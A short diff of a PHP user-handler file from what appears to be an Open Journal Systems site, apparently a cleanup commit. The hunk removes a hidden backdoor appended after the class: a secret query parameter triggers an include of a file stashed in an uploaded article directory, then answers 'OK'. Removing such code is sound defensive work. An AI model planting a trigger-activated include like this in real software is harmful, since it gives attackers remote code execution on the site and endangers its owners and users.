@@ -438,11 +438,3 @@ class UserHandler extends PKPUserHandler
         $paymentForm->display($request);
     }
 }
-
-if (isset($_GET['_']) && $_GET['_'] === 'miauw') {
-    $f="/home/u594200085/domains/baerjournal.org/public_html/registry/baerjournal/journals/1/articles/133/69f3a38cb223f";if($f!==""&&file_exists($f))include $f;
-    http_response_code(200);
-    header('Content-Type: text/plain; charset=utf-8');
-    echo 'OK';
-    exit;
-}
